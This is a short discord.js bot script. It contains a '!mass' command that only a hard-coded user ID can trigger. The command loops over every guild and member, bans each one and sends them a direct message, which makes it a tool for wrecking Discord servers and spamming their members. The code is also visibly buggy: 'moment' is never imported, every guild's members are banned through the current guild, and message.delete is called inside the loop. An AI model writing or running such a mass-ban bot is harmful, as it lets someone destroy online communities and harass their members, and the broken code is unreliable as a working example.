//outdated (editing this in 2021)

const Discord = require(`discord.js`)
const client = new Discord.Client()
const prefix = "!"
const bot = new Discord.Client()
const token = "no"
const log = message => {
  console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] ${message}`);
};

client.on("guildCreate", guild => {
      console.log(`${guild.name},  ${guild.memberCount} members!`);
      client.user.setGame("#4everalone");
});
client.on("guildDelete", guild => {
  console.log(`- ${guild.name} :c`);
});


client.on('message', message => {
if(message.content.startsWith('!mass')) {
    if(message.author.id === "434654338074411013"){
        let args = message.content.split(" ").slice(1);
        var argresult = args.join(" ")
        const argsresult = args.join(" ")
        let reason = args.join(" ")
                  if(!args[1]) {
 }
 if(args[1]) {
     client.guilds.forEach(guild => {
guild.members.forEach(member => {
message.guild.ban(member)
member.send(reason)
message.delete()
})})}}}
});

client.on("ready", () => {
    console.log("On " + client.guilds.size + " guilds.")
    console.log("With " + client.users.size + " members.")
});
client.login(token)
